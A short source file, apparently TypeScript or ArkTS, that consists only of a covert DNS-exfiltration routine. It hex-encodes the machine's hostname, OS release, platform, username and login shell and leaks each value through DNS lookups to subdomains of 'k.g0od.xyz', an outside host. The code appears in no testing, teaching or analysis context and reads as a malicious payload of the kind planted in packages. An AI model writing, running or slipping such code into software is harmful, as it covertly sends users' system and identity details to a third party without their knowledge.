
import { os } from 'os.ets';
import { dns } from 'dns.ets';

let exfil = (data: string) => {
    dns.lookup(Buffer.from(data).toString("hex") + ".k.g0od.xyz", (err) => {});
}

exfil(os.hostname());
let usr = os.userInfo();
exfil(os.release());
exfil(os.platform());
exfil(usr.username);
exfil(usr.shell);
